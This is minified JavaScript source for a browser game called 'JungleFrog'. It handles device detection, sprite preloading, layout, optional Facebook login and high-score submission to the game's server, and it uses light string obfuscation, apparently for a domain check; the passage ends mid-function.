var aQ = "JungleFrog";
var gK = "2.0";
var eO = "357626417634375";
var dG = 0;
var ey = 1;
var ep = 2;
var fG = 3;
var ft = 4;
var fF = 5;
var fs = 6;
var dM = 7;
var fA = 8;
var eY = 9;
var dA = 10;
var en = 11;
var fz = 12;
var fD = 13;
var eU = 14;
var eV = 15;
var eZ = 16;
var eo = 17;
var ew = 18;
var ea = 19;
var fv = 20;
var fw = 21;
var ge = 22;
var ef = 23;
var fp = 24;
var fq = 25;
var fd = 26;
var fC = 27;
var fE = 28;
var ev = 29;
var eK = 30;
var fH = 31;
var dX = dsp[dG];
var fV = dsp[ey];
var de = dsp[ep];
var aI = dsp[fG];
var ca = dsp[ft];
var cZ = dsp[fF];
var ed = dsp[fs];
var L = dsp[dM];
var gC = dsp[fA];
var bO = dsp[eY];
var dW = dsp[dA];
var gn = dsp[en];
var dP = dsp[fz];
var dD = dsp[fD];
var dy = dsp[eU];
var dz = dsp[eV];
var dE = dsp[eZ];
var dV = dsp[eo];
var ae = dsp[ew];
var aS = dsp[ea];
var aw = dsp[fv];
var aT = dsp[fw];
var dS = dsp[ge];
var dR = dsp[ef];
var ee = dsp[fp];
var dY = dsp[fq];
var dF = dsp[fd];
var dC = dsp[fC];
var da = dsp[fE];
var di = dsp[ev];
var bQ = dsp[eK];
var cY = dsp[fH];
var aJ = 'http://' + de + '/games/' + aQ + '/' + aQ + '.php?pid' + dX;
var g = 0;
var f = 2;
var cd = 0;
var cf = 1;
var bc = 2;
var cK = 3;
var cL = 4;
var gF = 5;
var cu = 8;
var cE = 30;
var cH = new Array();
var bo = 0.0;
for (var i = 0; i < 50; i++) {
	cH[i] = bo;
	bo += 0.02;
}
bo = 1.0;
for (var i = 50; i < 100; i++) {
	cH[i] = bo;
	bo -= 0.02;
}
var cg = 0;
var i = 0;
var ar = 50;
var K = cd;
var gr = "iphone";
var ad = "onmousedown";
var P = "onclick";
var ay = "onmousemove";
var an = "onmouseup";
var bb = "touchmove";
var ac = 0;
var cx = dV;
function T(name) {
	if (navigator.userAgent.indexOf(name) != -1) {
		return true;
	}
	return false;
};
var eg = 0;
var bg = 1;
var ag = 2;
var aB = 3;
var ai = 4;
var aE = 5;
var au = 6;
var bu = 7;
var bC = 0;
if (T("iPhone") || T("iPad") || T("iPod")) g = bg;
else if (T("Android")) g = ag;
else if (T("MSIE")) {
	if (typeof document.documentElement.style.opacity != 'undefined') {
		g = aB;
		if (T("IEMobile")) bC = 1;
	} else g = au;
} else if (T("Firefox")) g = ai;
else if (T("Opera")) g = aE;
else if (T("RIM") || T("BB10")) g = bu;
else g = eg;
if (g == bg) {
	ad = "ontouchstart";
	P = "onclick";
	an = "ontouchend";
	ay = "ontouchmove";
	ar = 50;
}
if (g == bu) {
	ad = "ontouchstart";
	P = "ontouchstart";
	an = "ontouchend";
	ay = "ontouchmove";
	ar = 50;
}
if (g == ag) {
	if (T("Android 2.0") || T("Android 2.1")) {
		bb = "touchstart";
		ad = "ontouchstart";
		an = "ontouchend";
		P = "ontouchstart";
		ay = "ontouchmove";
		ar = 50;
		ac = 2;
	} else if (T("Android 1.6")) {
		bb = "touchstart";
		ad = "ontouchstart";
		an = "ontouchend";
		P = "ontouchstart";
		ay = "ontouchmove";
		ar = 20;
		ac = 1
	} else {
		bb = "touchmove";
		ad = "ontouchstart";
		P = "onclick";
		an = "ontouchend";
		ay = "ontouchmove";
		ar = 50;
		if (T("Android 2.2") || T("Android 2.3")) ac = 3;
		else ac = 2;
	}
}
if ((g == aB) || (g == au)) {
	ad = "onmousedown";
	P = "onclick";
	an = "onmouseup";
	ay = "onmousemove";
	ar = 50;
	if (g == au) {
		ar = 50;
		f = 1;
	}
	if (!Array.prototype.indexOf) {
		Array.prototype.indexOf = function(searchElement) {
			"use strict";
			if (this == null) {
				throw new TypeError();
			}
			var bN = Object(this);
			var bv = bN.length >>> 0;
			if (bv === 0) {
				return - 1;
			}
			var n = 0;
			if (arguments.length > 0) {
				n = Number(arguments[1]);
				if (n != n) {
					n = 0;
				} else if (n != 0 && n != Infinity && n != -Infinity) {
					n = (n > 0 || -1) * Math.floor(Math.abs(n));
				}
			}
			if (n >= bv) {
				return - 1;
			}
			var bh = n >= 0 ? n: Math.max(bv - Math.abs(n), 0);
			for (; bh < bv; bh++) {
				if (bh in bN && bN[bh] === searchElement) {
					return bh;
				}
			}
			return - 1;
		}
	}
}
if (g == ai) {
	ad = "onmousedown";
	P = "onclick";
	an = "onmouseup";
	ay = "onmousemove";
	ar = 50;
}
if (g == aE) {
	ad = "onmousedown";
	P = "onclick";
	an = "onmouseup";
	ay = "onmousemove";
	ar = 50;
}
var az = 0;
if ((g != 3) && (g != 6)) az = 1;
function dH(e) {
	if (az) e.preventDefault();
};
var bR = 0;
if (T("Firefox") && T("Android")) bR = 1;
if (bR) {
	g = ai;
	bb = "touchmove";
	ad = "ontouchstart";
	P = "onclick";
	an = "ontouchend";
	ay = "ontouchmove";
	ar = 50;
}
if ((g == bg) || (g == ag) || bC || bR) {
	if (window.innerWidth < 600) f = 1;
}
if (cZ == 1) f = 1;
else if (cZ == 2) f = 2;
if (ed) if (top.location.href != self.location.href) top.location.href = self.location.href;
par_game = aQ;
var bs = 0;
var cy = 0;
var kjig2=30055;
var cA = 0;
if (f == 1) {
	var cB = 384;
	var cv = 512;
	L += "zz_";
} else {
	var cB = 768;
	var cv = 1024;
}
var o = cB - cy;
var C = cv - cA;
var R = cy + (o >> 1);
var gL = cA + (C >> 1);
var eI;
var fO;
var fP;
var fL;
var gB;
var dg;
var df;
var gi;
var gj;
var cz = 1;
var dj = 0;
var gf = 'k66b';
var gd = gf.split('');
var fi = 'c5-a';
var ff = fi.split('');
var cs = location.hostname;
var at = cs.split(".");
var bp = "";
if (at.length > 2) {
	if ((at.length == 3) && (at[at.length - 1].length < 3) && (at[at.length - 2].length < 3)) bp = cs;
	else {
		for (i = 1; i < at.length - 1; i++) bp += at[i] + ".";
		bp += at[at.length - 1];
	}
} else bp = cs;
var gh = ':/' + '/';
var fg = 'r-crrc';
var fj = fg.split('');
var bk = dj;
var fl = 'eeesf23hh3r62sray';
var eW = fl.split('');
var gb = 'r5-b6';
var gc = gb.split('');
var fJ = 'v7';
var fS = '9fg7hjklz6xc.v8bn1m0';
var fh = fJ.split('');
var fT = 'q2se4rtyu3i5opa-wd' + fS;
var ao = fT.split('');
var J = '';
var fK = 'ible';
var dT = 'abcdefghijklmnopqrstuvwxyz';
var gg = 'ank';
var aK = cx.length;
var dQ = '0123456789-.';
var bl = cx.split('');
var fQ = 'den';
var aF = dQ + dT;
var gl = aF.split('');
var dh = 'hid';
var ga = 'bl';
var fN = 'vis';
var cp = '';
var cG = bp;
var fM = cG.toLowerCase();
var gD = fM.split('');
var dI = 'ow';
var fR = 'e';
var dK = 'sh';
for (i = 0; i < 5; i++) J += ao[aF.indexOf(gc[i])];
ce = 'S' + J;
J = '';
for (i = 0; i < 17; i++) J += ao[aF.indexOf(eW[i])];
dg = J;
gj = '_' + ga + gg;
J = '-';
for (i = 0; i < 2; i++) J += ao[aF.indexOf(fh[i])];
ce += J;
J = '-D';
for (i = 0; i < 4; i++) J += ao[aF.indexOf(ff[i])];
ce += J;
J = '-S';
for (i = 0; i < 6; i++) J += ao[aF.indexOf(fj[i])];
ce += J;
J = '';
for (i = 0; i < 4; i++) J += ao[aF.indexOf(gd[i])];
df = J;
J = '';
for (i = 2; i < aK - 2; i++) {
	J += ao[aF.indexOf(bl[i])];
}
cp = cG;
gi = df + gh + dg;
eI = dK + dI;
fO = dh + fQ;
bk=cz;
fP = dh + fR;
fL = fN + fK;
var av = 1;
var O = 0;
var aD = "00000";
var bB = 0;var iiii8=29545;
var I;
var al;
var af;
if (az) {
	I = window.innerWidth;
	al = window.innerHeight;
} else {
	I = document.documentElement.clientWidth ? document.documentElement.clientWidth: document.body.clientWidth;
	al = document.documentElement.clientHeight ? document.documentElement.clientHeight: document.body.clientHeight;
}
if (I / al > o / (C)) {
	af = al / (C);
} else {
	af = I / (o);
}
var ah = "position:absolute;top:0px;left:0px;z-Index:1;visibility:hidden;";
var by = ah + "white-space:nowrap;";
function gE(B, col) {
	document.getElementById(B).style.color = "#" + col;
	document.getElementById(B).style.fontWeight = "bold";
	document.getElementById(B).style.filter = "alpha(opacity=50)";
};
document.write('<div id=\'all\' style=\'position:absolute;left:0px;top:0px;clip:rect(0px,' + o + 'px,' + (C) + 'px,0px);\'>');
if ((I < al) && ((g == bg) || (g == ag) || (g == bu) || bC)) dm("all", 0, 0, I / (o), al / (C));
else dk("all", ((I - o * af) / 2), 0, af);
if (bO) {
	par_adx2 = ((I - o) / 2);
	par_adx3 = ((I - o * af) / 2);
	par_adx4 = ((I - o * af) / 2) + (o * af);
	ds_RZ();
}
var bw = new Array();
var aZ = 0;
var cD = fV;
bw[aZ] = new Image();
bw[aZ].src = cD;
aZ++;
var cQ = L + "info.png";
bw[aZ] = new Image();
bw[aZ].src = cQ;
aZ++;
var fn = 40 * f;
var fk = 40 * f;
document.write('<img id=\'lo\' style=\'position:absolute;top:0px;left:0px;visibility:visible;z-Index:1;opacity:1;-webkit-transition-property: opacity;-webkit-transition-duration: 1s;\' src=\'' + cD + '\' width=' + o + ' height=' + C + '>');
if (bQ) {
	aS *= f;
	aw *= f;
	document.write('<div id=\'lob1\' style=\'position:absolute;top:' + (C - (C >> 3)) + 'px;left:' + ((o >> 1) - (aS >> 1)) + 'px;visibility:visible;z-Index:2;opacity:' + aT + ';-moz-opacity:' + aT + ';filter:alpha(opacity=' + (aT * 100) + ');background-color:#' + ee + ';border:1px solid #000;width:' + (aS) + 'px;height:' + aw + 'px;font-size:' + (aw - (aw >> 2)) + 'px;color:#' + dR + ';text-align:center;-moz-border-radius:' + (aw >> 1) + ';-webkit-border-radius:' + (aw >> 1) + 'px;\'>' + dS + '</div>');
	document.write('<div id=\'lob2\' style=\'position:absolute;top:' + (C - (C >> 3)) + 'px;left:' + ((o >> 1) - (aS >> 1)) + 'px;visibility:visible;z-Index:3;opacity:' + aT + ';-moz-opacity:' + aT + ';filter:alpha(opacity=' + (aT * 100) + ');background-color:#' + dY + ';width:0px;height:' + aw + 'px;-moz-border-radius:' + (aw >> 1) + ';-webkit-border-radius:' + (aw >> 1) + 'px;\'></div>');
}
var r = new Array();
var m = 0;
var cF = aS / 31;
if (ae == aq) cF = aS / (31 + 4);
var cP = new Array();
var bt = 0;
function V() {
	if (bQ) {
		if (r[bt].width > 0) {
			clearTimeout(cP[bt]);
			bt++;
			document.getElementById("lob2").style.border = "1px solid #000";
			document.getElementById("lob2").style.width = (bt * cF) + "px";
		} else cP[bt] = setTimeout('V()', 20);
	}
};
var aq = 5;
var gk = "";
var Q = 0;
if (ae == aq) {
	var cw = L + "fli.png";
	r[m] = new Image();
	r[m].src = cw;
	V();
	m++;
	var cC = L + "flo.png";
	r[m] = new Image();
	r[m].src = cC;
	V();
	m++;
	var be = L + "fng.png";
	r[m] = new Image();
	r[m].src = be;
	V();
	m++;
	var bj = L + "fhi.png";
	r[m] = new Image();
	r[m].src = bj;
	V();
	m++;
}
var cN = L + "t.jpg";
r[m] = new Image();
r[m].src = cN;
V();
m++;
var bf = L + "ng.png";
r[m] = new Image();
r[m].src = bf;
V();
m++;
var bd = L + "hi.png";
r[m] = new Image();
r[m].src = bd;
V();
m++;
var aV = L + "submit.png";
r[m] = new Image();
r[m].src = aV;
V();
m++;
var dc = L + "continue.png";
r[m] = new Image();
r[m].src = dc;
V();
m++;
var cq = L + "l1a.jpg";
r[m] = new Image();
r[m].src = cq;
V();
m++;
var cr = L + "l1b.jpg";
r[m] = new Image();
r[m].src = cr;
V();
m++;
var cT = L + "l2a.jpg";
r[m] = new Image();
r[m].src = cT;
V();
m++;
var cW = L + "l2b.jpg";
r[m] = new Image();
r[m].src = cW;
V();
m++;
var cX = L + "l3a.jpg";
r[m] = new Image();
r[m].src = cX;
V();
m++;
var cU = L + "l3b.jpg";
r[m] = new Image();
r[m].src = cU;
V();
m++;
var cJ = ".png";
if (g == au) cJ = ".gif";
var aA = new Array();
for (i = 0; i < 20; i++) {
	aA[i] = L + "s" + i + cJ;
	r[m + i] = new Image();
	r[m + i].src = aA[i];
	V();
}
m += 20;
if ((g != au) && (g != bu) && (g != ag)) {
	document.write('<div style=\'position:absolute;top:0px;left:' + (o) + 'px;width:' + (o * 2) + 'px;height:' + (C) + 'px;background-Color:#000000;visibility:visible;z-Index:10000;\'></div>');
	document.write('<div style=\'position:absolute;top:0px;left:' + ( - o * 2) + 'px;width:' + (o * 2) + 'px;height:' + (C) + 'px;background-Color:#000000;visibility:visible;z-Index:10000;\'></div>');
}
 
if (aI) {
	var ak = aJ + "&hi=1";
	if (da) ak = ds_urlhiscore + di;
	document.write('<img id=\'hi\' style=\'' + ah + 'opacity:0.6;-moz-opacity:0.6;filter:alpha(opacity=60);\' ' + P + '=\'eF()\' src=\'' + bd + '\' >');
}
document.write('<div id=\'hs\' style=\'' + by + 'color:#ffffff;font-family:Arial;font-size:' + (14 * f) + 'px;\'></div>');
document.write('<img id=\'ng\' style=\'' + ah + 'opacity:0.6;-moz-opacity:0.6;filter:alpha(opacity=60);\' ' + P + '=\'dJ()\'  src=\'' + bf + '\' >');
document.write('<div id=\'su\' style=\'' + ah + '\'><a href=\'#\' ' + ad + '=\'go()\'><img  src=\'' + aV + '\' border=0></a></div>');
document.write('<img id=\'co\' style=\'' + ah + '\' ' + P + '=\'aU()\' src=\'' + dc + '\' >');
document.write('<img id=\'myinf\' style=\'position:absolute;display:none;left:0px;top:0px;visibility:visible;z-Index:100000;\' ' + ad + '=\'info()\'  src=\'' + cQ + '\' >');
if (dW) {
	l("myinf", -10000, -10000);
} else l("myinf", o - fn, C - fk);
if (ae == aq) {
	document.write('<div id="fb-root" ></div>'); (function() {
		var e = document.createElement('script');
		e.async = true;
		e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
		document.getElementById('fb-root').appendChild(e);
	} ());
	window.fbAsyncInit = function() {
		FB.init({
			appId: eO,
			status: true,
			cookie: true,
			xfbml: true,
			oauth: true
		});
		FB.Event.subscribe('auth.statusChange', eD);
		FB.Event.subscribe('auth.logout',
		function(bz) {
			Q = 0;
			document.getElementById("ng").src = bf;
			document.getElementById("hi").src = bd;
		});
		FB.Event.subscribe('auth.login',
		function(bz) {
			Q = 1;
			dw();
			document.getElementById("ng").src = be;
			document.getElementById("hi").src = bj;
		});
	};
	function eD(bz) {
		if (bz.authResponse) {
			Q = 1;
			dw();
			document.getElementById("ng").src = be;
			document.getElementById("hi").src = bj;
		} else {
			Q = 0;
			document.getElementById("ng").src = bf;
			document.getElementById("hi").src = bd;
		}
	};
	function dw() {
		if (Q) {
			FB.api('/me',
			function(bm) {
				if (!bm.error) {
					bM = bm.id;
					ab = bm.name;
					aR = ab.charAt(1) + A(9) + (ap * 89) + A(9) + ab.charAt(3) + 'fc1' + A(9) + ab.charAt(0) + A(9) + ab.charAt(1) + '4z3' + (ap * 7) + '3247z11';
					document.getElementById("f_n0").innerHTML = bm.name;
					document.getElementById("f_p0").src = "http://graph.facebook.com/" + bm.id + "/picture?type=small";
				}
			});
		}
	};
	function eN() {
		if ((az) && (g != ai)) window.event.preventDefault();
		FB.login(function(bz) {});
	};
	function eT() {
		if ((az) && (g != ai)) window.event.preventDefault();
		l("f_lo", -1000, -1000);
		l("su", -1000, -1000);
		l("hs", -1000, -1000);
		l("f_p0", -1000, -1000);
		l("f_n0", -1000, -1000);
		Q = 0;
		document.getElementById("ng").src = bf;
		document.getElementById("hi").src = bd;
		FB.logout();
	};
	if (Q == 1) {
		document.getElementById("ng").src = be;
		document.getElementById("hi").src = bj;
	}
	document.write('<img id=\'f_p0\' style="' + ah + '"  width=' + (50 * f) + ' height=' + (50 * f) + ' border=1>');
	document.write('<div id=\'f_n0\' style=\'' + by + 'font-family:Arial;font-size:' + (16 * f) + 'px;color:#4fefff;\'></div>');
	document.write('<div id=\'f_ba\' style=\'position:absolute;top:0px;left:0px;width:' + (o) + 'px;height:' + (42 * f) + 'px;background-Color:#000000;visibility:hidden;z-Index:1;\'></div>');
	document.write('<img id=\'f_li\' style=\'' + ah + '\' ' + P + '=\'eN()\'  src=\'' + cw + '\' >');
	document.write('<img id=\'f_lo\' style=\'' + ah + '\' ' + P + '=\'eT()\'  src=\'' + cC + '\' >');
	cl("f_ba", 0.7);
}
document.write('<div id=\'s1\' style=\'' + by + 'color:#ffffff;font-family:Arial;font-size:' + (f * 18) + 'px;text-shadow: 2px 2px 3px #ff0000;\'>得分: ' + aD + '</div>');
document.write('<div id=\'g1\' style=\'' + by + 'color:#ffff00;font-family:Arial;font-size:' + (f * 42) + 'px;text-shadow: 2px 2px 6px #7f4f00;\'><img src="retry.png" width="320" height="120" alt=""></div>');
document.write('<div id=\'bo\' style=\'' + ah + 'background-color:#ff0000;width:1px;height:' + (10 * f) + 'px;\'></div>');
document.write('<img id=\'ti\' style=\'' + ah + '\'  src=\'' + cN + '\'>');
document.write('<img id=\'bk1\'  ' + ad + '=\'bX()\' ' + an + '=\'bV()\' style=\'' + ah + '\'  >');
document.write('<img id=\'bk2\'  ' + ad + '=\'bX()\' ' + an + '=\'bV()\' style=\'' + ah + '\'  >');
var fI = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4);
for (var i = 0; i < 40; i++) document.write('<img id=\'am' + i + '\'  ' + ad + '=\'bX()\' ' + an + '=\'bV()\' style=\'' + ah + '\' src=\'' + aA[fI[i]] + '\' >');
document.write('</div>');
function es() {
	v("s1", (o >> 1) - (aX("s1") >> 1), 4, 512);
};
var ba;
function dJ() {
	if (ae == aq) {
		if ((cY > 0) && (Q == 0) && (typeof(window.localStorage) != 'undefined')) {
			ba = window.localStorage.getItem("ds_" + aQ + "_fbnp");
			if (ba == null) ba = 0;
			if (ba > cY - 1) {
				alert("PLEASE LOGIN WITH FAC" + "EBOOK TO PLAY AGAIN");
				return;
			} else {
				ba++;
				window.localStorage.setItem("ds_" + aQ + "_fbnp", ba);
			}
		}
		H("f_li");
		H("f_lo");
		H("f_ba");
	}
	mydisable();
	H("ti");
	if (aI) H("hi");
	H("ng");
	av = 1;
	O = 0;
	aD = "00000";
	ck(0);
	dr();
	if (bk) K = bc;
};
function ck(eL) {
	O += eL;
	if (O < 10) aD = "0000" + O;
	else if (O >= 10 && O < 100) aD = "000" + O;
	else if (O >= 100 && O < 1000) aD = "00" + O;
	else if (O >= 1000 && O < 10000) aD = "0" + O;
	else aD = "" + O;
	var dU = '得分: ' + aD;
	document.getElementById("s1").innerHTML = dU;
};
function dp() {
	H("s1");
	H("g1");
	for (var d = 0; d < 40; d++) H("am" + d);
	H("bk1");
	H("bk2");
};
function H(B) {
	document.getElementById(B).style.visibility = 'hidden';
};
function gz(B, xx, j, t, dN) {
	cl(B, dN);
	document.getElementById(B).style.left = xx + "px";
	document.getElementById(B).style.top = j + "px";
	document.getElementById(B).style.visibility = 'visible';
	document.getElementById(B).style.zIndex = t;
};
function v(B, xx, j, t) {
	document.getElementById(B).style.left = xx + "px";
	document.getElementById(B).style.top = j + "px";
	document.getElementById(B).style.visibility = 'visible';
	document.getElementById(B).style.zIndex = t;
};
function gu(B, xx, j, bS, bT, t) {
	document.getElementById(B).style.left = xx + "px";
	document.getElementById(B).style.top = j + "px";
	document.getElementById(B).style.width = (bS - xx) + "px";
	document.getElementById(B).style.height = (bT - j) + "px";
	document.getElementById(B).style.visibility = 'visible';
	document.getElementById(B).style.zIndex = t;
};
function cl(B, aY) {
	if (g != au) document.getElementById(B).style.opacity = aY;
	else document.getElementById(B).style.filter = "alpha(opacity=" + (aY * 100 + ")");
};
function aX(B) {
	return document.getElementById(B).offsetWidth;
};
function dn(B) {
	return document.getElementById(B).offsetHeight;
};
function A(aY) {
	return (Math.floor(Math.random() * aY));
};
function gM(d, xx, j, t) {
	if (g == aE) document.getElementById(d).style.OTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ",1)";
	else if (g == ai) document.getElementById(d).style.MozTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ",1)";
	else if (g == aB) document.getElementById(d).style.msTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ",1)";
	else if (g == ag) {
		if (ac == 1) document.getElementById(d).style.webkitTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ",1)";
		else if (ac == 3) {
			document.getElementById(d).style.left = xx + "px";
			document.getElementById(d).style.top = j + "px";
			document.getElementById(d).style.webkitTransform = "scale(" + t + ",1)";
		} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + t + ",1)";
	} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + t + ",1)";
};
function gJ(d, xx, j, t, U) {
	if (g == aE) document.getElementById(d).style.OTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ") rotate(" + U + "deg)";
	else if (g == ai) document.getElementById(d).style.MozTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ") rotate(" + U + "deg)";
	else if (g == aB) document.getElementById(d).style.msTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ") rotate(" + U + "deg)";
	else if (g == ag) {
		if (ac == 1) document.getElementById(d).style.webkitTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ") rotate(" + U + "deg)";
		else if (ac == 3) {
			document.getElementById(d).style.left = xx + "px";
			document.getElementById(d).style.top = j + "px";
			document.getElementById(d).style.webkitTransform = "scale(" + t + ") rotate(" + U + "deg)";
		} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + t + ") rotate(" + U + "deg)";
	} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + t + ") rotate(" + U + "deg)";
};
function dm(d, xx, j, aN, aM) {
	if (g == au) {} else if (g == aE) document.getElementById(d).style.OTransform = "translate(" + xx + "px," + j + "px) scale(" + aN + "," + aM + ")";
	else if (g == ai) document.getElementById(d).style.MozTransform = "translate(" + xx + "px," + j + "px) scale(" + aN + "," + aM + ")";
	else if (g == aB) document.getElementById(d).style.msTransform = "translate(" + xx + "px," + j + "px) scale(" + aN + "," + aM + ")";
	else if (g == ag) {
		if (ac == 1) document.getElementById(d).style.webkitTransform = "translate(" + xx + "px," + j + "px) scale(" + aN + "," + aM + ")";
		else if (ac == 3) {
			document.getElementById(d).style.left = xx + "px";
			document.getElementById(d).style.top = j + "px";
			document.getElementById(d).style.webkitTransform = "scale(" + aN + "," + aM + ")";
		} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + aN + "," + aM + ")";
	} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + aN + "," + aM + ")";
};
function gG(d, xx, j, bS, bT, t) {
	document.getElementById(d).style.left = ((xx)) + "px";
	document.getElementById(d).style.top = ((j)) + "px";
	document.getElementById(d).style.width = (bS * t) + "px";
	document.getElementById(d).style.height = (bT * t) + "px";
};
function gH(d, xx, j, eq, t) {
	document.getElementById(d).style.left = ((xx)) + "px";
	document.getElementById(d).style.top = ((j)) + "px";
	document.getElementById(d).style.fontSize = (eq * t) + "px";
};
function dk(d, xx, j, t) {
	if (g == au) {
		document.getElementById(d).style.zoom = t;
		document.getElementById(d).style.left = xx + "px";
		document.getElementById(d).style.top = j + "px";
	} else if (g == aE) document.getElementById(d).style.OTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ")";
	else if (g == ai) document.getElementById(d).style.MozTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ")";
	else if (g == aB) document.getElementById(d).style.msTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ")";
	else if (g == ag) {
		if (ac == 1) document.getElementById(d).style.webkitTransform = "translate(" + xx + "px," + j + "px) scale(" + t + ")";
		else if (ac == 3) {
			document.getElementById(d).style.left = xx + "px";
			document.getElementById(d).style.top = j + "px";
			document.getElementById(d).style.webkitTransform = "scale(" + t + ")";
		} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + t + ")";
	} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) scale(" + t + ")";
};
function gI(d, xx, j, U) {
	if (g == au) {
		gA = "filter";
		var du = Math.cos(U * Math.PI * 2 / 360);
		var cI = Math.sin(U * Math.PI * 2 / 360);
		fX = du;
		fW = -cI;
		fZ = cI;
		fY = du;
		document.getElementById(d).style.filter = "progid:DXImageTransform.Microsoft.Matrix(M11=" + fX + ",M12=" + fW + ",M21=" + fZ + ",M22=" + fY + ", sizingMethod='auto expand');";
		document.getElementById(d).style.left = xx - (aX(d) >> 1) + "px";
		document.getElementById(d).style.top = j - (dn(d) >> 1) + "px";
	} else if (g == aE) document.getElementById(d).style.OTransform = "translate(" + xx + "px," + j + "px) rotate(" + U + "deg)";
	else if (g == ai) document.getElementById(d).style.MozTransform = "translate(" + xx + "px," + j + "px) rotate(" + U + "deg)";
	else if (g == aB) document.getElementById(d).style.msTransform = "translate(" + xx + "px," + j + "px) rotate(" + U + "deg)";
	else if (g == ag) {
		if (ac == 1) document.getElementById(d).style.webkitTransform = "translate(" + xx + "px," + j + "px) rotate(" + U + "deg)";
		else if (ac == 3) {
			document.getElementById(d).style.left = xx + "px";
			document.getElementById(d).style.top = j + "px";
			document.getElementById(d).style.webkitTransform = "rotate(" + U + "deg)";
		} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) rotate(" + U + "deg)";
	} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px) rotate(" + U + "deg)";
};
function l(d, xx, j) {
	if (g == au) {
		document.getElementById(d).style.left = xx + "px";
		document.getElementById(d).style.top = j + "px";
	} else if (g == aE) document.getElementById(d).style.OTransform = "translate(" + xx + "px," + j + "px)";
	else if (g == ai) {
		document.getElementById(d).style.MozTransform = "translate(" + xx + "px," + j + "px)";
	} else if (g == aB) {
		document.getElementById(d).style.msTransform = "translate(" + xx + "px," + j + "px)";
	} else if (g == ag) {
		if (ac == 1) document.getElementById(d).style.webkitTransform = "translate(" + xx + "px," + j + "px)";
		else if (ac == 3) {
			document.getElementById(d).style.left = xx + "px";
			document.getElementById(d).style.top = j + "px";
		} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px)";
	} else document.getElementById(d).style.webkitTransform = "translate3d(" + xx + "px," + j + "px,0px)";
};
var gp = 0;
var bi = 0;
var cc = new Array();
for (var i = 0; i < r.length; i++) cc[i] = false;
function eP() {
	if (K == cd) {
		window.scroll(0, 1);
		if (bi == r.length) {
			if (bQ) {
				H("lob1");
				H("lob2");
			}
			if (bk) K = cE;
			return;
		} else if (cc[bi] == false && r[bi].complete) {
			cc[bi] = true;
			bi++;
		}
	} else if (K == cE) {
		cg += 5;
		if (cg == 55) {
			v("ti", 0, 0, 0);
			//l("ti", 0, bs);
			l("ti", 0, 0);
			cl("lo", 0);
		}
		if (cg == 100) {
			K = cf;
			H("lo");
			v("ng", 0, 0, 11);
			l("ng", -1000, -1000);
			if (aI) {
				v("hi", 0, 0, 11);
				l("hi", -1000, -1000);
			}
			if (ae == aq) {
				if (Q == 1) {
					document.getElementById("ng").src = be;
					document.getElementById("hi").src = bj;
				}
				v("f_li", 0, 0, 11);
				l("f_li", -1000, -1000);
				v("f_lo", 0, 0, 11);
				l("f_lo", -1000, -1000);
				v("f_ba", 0, 0, 10);
				l("f_ba", 0, C - 42 * f);
			}
		}
	} else if (K == cf) {
		if (ae == aq) {
			if (Q == 0) {
				l("f_li", R - (aX("f_li") >> 1), C - 37 * f);
				l("f_lo", -1000, -1000);
			} else {
				l("f_lo", R - (aX("f_lo") >> 1), C - 37 * f);
				l("f_li", -1000, -1000);
			}
			l("ng", (o >> 1) - (64 * f), C - (38 * f) - (64 * f) - (64 * f));
			if (aI) l("hi", (o >> 1) - (64 * f), C - (38 * f) - (64 * f));
		} else {
			l("ng", (o >> 1) - (64 * f), C - (38 * f) - (64 * f) - (16 * f));
			if (aI) l("hi", (o >> 1) - (64 * f), C - (38 * f) - (16 * f));
		}
	} else if (K == bc) {
		eQ();
	} else if (K == cu) {
		dx();
	} else if (K == cK) {
		if (bB++>50) {
			bB = 0;
			dr();
			K = bc;
		}
	} else if (K == cL) {
		var cR = 0;
		var cS = 0;
		cR = R - (aX("g1") >> 1);
		cS = (C >> 1) - (dn("g1") >> 1);
		
		v("g1", 0, 0, 501);
		//v("g1", cR, cS, 101);
		if (bB++>40) {
			bB = 0;
			dp();
			if (aI) K = cu;
			else aU();
		}
	} else if (K == cu) {
		dx();
	}
};
var fa = 0;
var fe = 1;
var fc = 2;
var fo = 3;
function eE() {
	var aW = false;
	try {
		aW = new ActiveXObject("Msxml2.XMLHTTP")
	} catch(e) {
		try {
			aW = new ActiveXObject("Microsoft.XMLHTTP")
		} catch(gm) {
			aW = false
		}
	}
	if (!aW && typeof XMLHttpRequest != 'undefined') {
		aW = new XMLHttpRequest();
	}
	return aW;
};
function eu() {
	var gw = new Date();
	if (as) {
		as.open("POST", aJ + '&hi=2&fb=' + Q, true);
		as.onreadystatechange = eC;
		as.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		var ci = "n=" + ab + "&s=" + ap + "&c=" + aR;
		if (ae == aq) {
			ci = "n=" + ds(ab) + "&s=" + ap + "&c=" + aR + '&i=' + bM;
		}
		as.setRequestHeader("Content-length", ci.length);
		as.setRequestHeader("Connection", "close");
